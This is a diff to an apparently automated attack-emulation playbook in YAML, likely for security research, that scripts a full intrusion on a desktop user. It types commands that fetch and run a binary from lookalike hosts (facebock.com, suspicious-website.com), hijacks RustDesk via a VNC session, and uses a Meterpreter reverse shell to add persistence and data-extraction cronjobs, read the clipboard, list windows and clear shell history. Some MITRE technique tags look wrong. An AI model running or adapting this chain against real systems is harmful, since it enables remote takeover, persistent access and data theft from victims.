@@ -28,20 +28,15 @@ commands:
     creates_session: tunnel
     cmd: "ssh -i /home/aecid/.ssh/attacker  -o StrictHostKeyChecking=no -L 5902:$CLIENT_IP:$CLIENT_VNC_PORT $MGMT_USERNAME@$MGMT_IP \n"
 
-
-
-################### SERVE THE FAKE EXECUTABLE ############################
+################### SERVE VEILTRANSFER CLIENT ############################
 
   # serve payload via http
   - type: webserv
-    local_path: /home/aecid/firefox-startup
+    local_path: /home/aecid/VeilTransfer/veiltransfer_client_linux
     port: 8082
     background: True
 
-  - type: sleep
-    seconds: 3
-
-
+################### SERVE THE METERPRETER PAYLOAD ############################
 
   # tempfile for reverse shell payload
   - type: mktemp
@@ -78,8 +73,7 @@ commands:
     port: 5902
     creates_session: social_engineering
 
-# Opening a terminal from the menu
-
+  # Opening a terminal from the menu
   - type: vnc
     cmd: move
     x: 5
@@ -154,7 +148,7 @@ commands:
   - type: sleep
     seconds: 10
 
-# start rustdesk
+  # start rustdesk
   - type: vnc
     cmd: type
     input: "rustdesk"
@@ -171,7 +165,7 @@ commands:
   - type: sleep
     seconds: 2
 
-# option menu
+  # option menu
   - type: vnc
     cmd: move
     x: 167
@@ -188,7 +182,7 @@ commands:
   - type: sleep
     seconds: 1
 
-# network
+  # network
   - type: vnc
     cmd: move
     x: 82
@@ -202,7 +196,7 @@ commands:
   - type: sleep
     seconds: 1
 
-# unlock network settings
+  # unlock network settings
   - type: vnc
     cmd: move
     x: 468
@@ -216,8 +210,7 @@ commands:
   - type: sleep
     seconds: 1
 
-# enter password
-
+  # enter password
   - type: vnc
     cmd: type
     input: "garland"
@@ -234,7 +227,7 @@ commands:
   - type: sleep
     seconds: 2
 
-# id relay server
+  # id relay server
   - type: vnc
     cmd: move
     x: 268
@@ -248,7 +241,7 @@ commands:
   - type: sleep
     seconds: 1
 
-# Enter id server IP
+  # Enter id server IP
   - type: vnc
     cmd: type
     input: $ATTACKMATE_IP
@@ -257,7 +250,7 @@ commands:
   - type: sleep
     seconds: 1
 
-# click ok
+  # click ok
   - type: vnc
     cmd: move
     x: 621
@@ -271,10 +264,7 @@ commands:
   - type: sleep
     seconds: 1
 
-# open a fresh terminal
-
-# Opening a new terminal from the menu in the client that the attacker will be able to use
-
+  # Opening a new terminal from the menu in the client that the attacker will be able to use
   - type: vnc
     cmd: move
     x: 5
@@ -304,10 +294,9 @@ commands:
   - type: sleep
     seconds: 3
 
-  
 ##################### ATTACKER CONFIGURES THEIR RUSTDESK CLIENT ############################
 
-# connect to attacker screen
+  # connect to attacker screen
   - type: vnc
     cmd: capture
     filename: initial_screenshot.png
@@ -315,7 +304,7 @@ commands:
     port: 5900
     creates_session: attacker
 
-# Opening a terminal from the menu
+  # Opening a terminal from the menu
 
   - type: vnc
     cmd: move
@@ -379,9 +368,8 @@ commands:
   - type: sleep
     seconds: 10
 
-# enter the attacker ID in the rustdesk client on the attacker machine
-
-# option menu
+  # enter the attacker ID in the rustdesk client on the attacker machine
+  # option menu
   - type: vnc
     cmd: move
     x: 167
@@ -398,7 +386,7 @@ commands:
   - type: sleep
     seconds: 1
 
-# network
+  # network
   - type: vnc
     cmd: move
     x: 82
@@ -412,7 +400,7 @@ commands:
   - type: sleep
     seconds: 1
 
-# unlock network settings
+  # unlock network settings
   - type: vnc
     cmd: move
     x: 468
@@ -442,7 +430,7 @@ commands:
   - type: sleep
     seconds: 2
 
-# id relay server
+  # id relay server
   - type: vnc
     cmd: move
     x: 351
@@ -456,7 +444,7 @@ commands:
   - type: sleep
     seconds: 5
 
-# Enter id server IP
+  # Enter id server IP
   - type: vnc
     cmd: type
     input: $ATTACKMATE_IP
@@ -465,7 +453,7 @@ commands:
   - type: sleep
     seconds: 5
 
-# Key Field
+  # Key Field
   - type: vnc
     cmd: move
     x: 334
@@ -479,7 +467,7 @@ commands:
   - type: sleep
     seconds: 5
 
-# Enter key
+  # Enter key
   - type: vnc
     cmd: type
     input: $RUSTDESK_KEY
@@ -488,7 +476,7 @@ commands:
   - type: sleep
     seconds: 5
 
-# click ok
+  # click ok
   - type: vnc
     cmd: move
     x: 621
@@ -504,8 +492,7 @@ commands:
 
 ##################### ATTACKER CONNECTS TO CLIENT WITH RUSTDESK ############################
 
-# Opening a terminal from the menu
-
+  # Opening a terminal from the menu
   - type: vnc
     cmd: move
     x: 5
@@ -535,7 +522,7 @@ commands:
   - type: sleep
     seconds: 7
 
- # open rustdesk with client id and client  from the terminal
+  # open rustdesk with client id and client from the terminal
   - type: vnc 
     cmd: type 
     input: "rustdesk --connect $CLIENT_RUSTDESK_ID -p password"
@@ -552,8 +539,7 @@ commands:
   - type: sleep
     seconds: 20
 
-## accept connection on the client side
-
+  # accept connection on the client side
   - type: vnc
     cmd: move
     x: 802
@@ -570,9 +556,8 @@ commands:
   - type: sleep
     seconds: 5
 
-## attackers interactions via screenshares on the client desktop
-# select the vnc tab
-
+  ## attackers interactions via screenshares on the client desktop
+  # select the vnc tab
   - type: vnc
     cmd: move
     x: 581
@@ -589,9 +574,7 @@ commands:
   - type: sleep
     seconds: 5
 
-# click into the open client terminal on the client screen
-
-
+  # click into the open client terminal on the client screen
   - type: vnc
     cmd: move
     x: 200
@@ -607,8 +590,8 @@ commands:
 
   - type: sleep
     seconds: 5
-# download fake install script
 
+  # download fake install script
   - type: vnc
     cmd: type
     input: "curl -o /tmp/index facebock.com:8080/index"
@@ -625,7 +608,7 @@ commands:
   - type: sleep
     seconds: 10
 
-# make it executable
+  # make it executable
   - type: vnc
     cmd: type
     input: "sudo chmod +x /tmp/index"
@@ -642,16 +625,14 @@ commands:
   - type: sleep
     seconds: 1
 
-##### Persistence OPTION B ######## set up a cronjob that executes the reverse shell
-
-# TODO check escaped characters
+  # execute the reverse shell via the fake binary
   - type: vnc
     cmd: type
-    input: "(crontab -l 2>/dev/null; echo \"*/5 * * * * /bin/bash -c '/tmp/index &'\") | crontab -"
+    input: "/tmp/index &"
     session: attacker
-  
+
   - type: sleep
-    seconds: 1
+    seconds: 2
 
   - type: vnc
     cmd: key
@@ -659,13 +640,10 @@ commands:
     session: attacker
 
   - type: sleep
-    seconds: 3
+    seconds: 5
 
-  - type: debug
-    seconds: wait for cronjob to get executed
 
-  - type: sleep
-    seconds: 60
+##### Persistence OPTION B ######## set up a cronjob that executes the reverse shell
 
   # run commands via reverse shell
   - type: msf-session
@@ -673,78 +651,93 @@ commands:
     session: revshell
     cmd: sysinfo
 
+  # upload cronjob that persists reverse shell
+  - type: msf-session
+    session: revshell
+    cmd: upload crontab.txt
 
-  # vnc connect to client via tunnel (this is "client is instructed via phone"), take screenshot
+  # upload cronjob that extracts data
+  - type: msf-session
+    session: revshell
+    cmd: upload downloader.txt
 
-  # open terminal and download rust desk package, make executable, install
+  # get interactive shell
+  - type: msf-session
+    cmd: shell
+    session: revshell
 
-  # expect screens that prompt user interaction during install process + enter options (1 and 2, then press any key)
+  - type: msf-session
+    cmd: python3 -c "import pty;pty.spawn(\"/bin/bash\")";
+    session: revshell
+ 
+  - type: msf-session
+    cmd: export SHELL=bash
+    session: revshell
+ 
+  - type: msf-session
+    cmd: export TERM=xterm256-color
+    session: revshell
 
-  # set rustdesk password
+  - type: msf-session
+    cmd: stty rows 38 columns 116
+    session: revshell
 
-  # start rustdesk
+  # needed for xclip and wmctrl
+  - type: msf-session
+    cmd: export DISPLAY=:0
+    session: revshell
 
-  # somehow configure via gui to use attacker IP as server ID
+################### ATTACKER GATHERS INFORMATION ############################
 
-  # get client id from rustdesk server log on attacker. regex?
+  # download the veiltransfer_client_linux executable
+  - type: msf-session
+    cmd: curl -o /home/judy/.local/bin/veiltransfer_client_linux suspicious-website.com:8082/index
+    session: revshell
 
-  # via shell command start connection from attacker machine with retrieved id and set password
+  # get the last clipboard entry
+  - type: msf-session
+    session: revshell
+    cmd: xclip -selection clipboard -o
+    metadata:
+      techniques: "T1515"
 
-  # vnc connect attacker on its own screen that should now show the clients screen, open terminal, run command to download (facebock.com), make executable and execute install.sh metasploit script
+  # make the veiltransfer client binary executable
+  - type: msf-session
+    session: revshell
+    cmd: chmod +x /home/judy/.local/bin/veiltransfer_client_linux 
 
-  # use established meterpreter session
+  # add the cronjob that persists reverse shell
+  - type: msf-session
+    session: revshell
+    cmd: (crontab -l; cat /home/judy/crontab.txt) | crontab -
+    metadata:
+      techniques: "T1053"
 
-# Meterpreter in a Nutshell
-#  # tempfile for reverse shell payload
-#  - type: mktemp
-#    cmd: file
-#    variable: RSHELL
-#  
-#  # generate reverse shell
-#  - type: shell
-#    cmd: msfvenom -p $PAYLOAD LHOST=$ATTACKMATE_IP LPORT=$LPORT -f elf > ${RSHELL}
-#  
-#  # serve payload via http
-#  - type: webserv
-#    local_path: $RSHELL
-#    port: 8080
-#    background: True
-#
-#  # prepare reverse-shell-listener
-#  - type: msf-module
-#    creates_session: revshell
-#    cmd: exploit/multi/handler
-#    payload: $PAYLOAD
-#    payload_options:
-#      LHOST: $ATTACKMATE_IP
-#      LPORT: $LPORT
-#    background: true
-#    kill_on_exit: true
-#
-#  # run commands via reverse shell
-#  - type: msf-session
-#    stdapi: true
-#    session: revshell
-#    cmd: sysinfo
+  # add the cronjob to extract data
+  - type: msf-session
+    session: revshell
+    cmd: (crontab -l; cat /home/judy/downloader.txt) | crontab -
+    metadata:
+      techniques: "T1029"
 
-## execute the script
-#  - type: vnc
-#    cmd: type
-#    input: "/tmp/index &"
-#    session: attacker
-#    
-#  - type: sleep
-#    seconds: 1
-#
-#  - type: vnc
-#    cmd: key
-#    key: "enter"
-#    session: attacker
-#
-#  - type: sleep
-#    seconds: 3
-#
+  # find out which windows are open
+  - type: msf-session
+    session: revshell
+    cmd:  wmctrl -l
+    metadata:
+      techniques: "T010"
 
+  # clear history
+  - type: msf-session
+    session: revshell
+    cmd: history -c
+    metadata:
+      techniques: "T1565"
+
+  # exit the interactive shell
+  - type: msf-session
+    session: revshell
+    cmd: exit
 
 
   
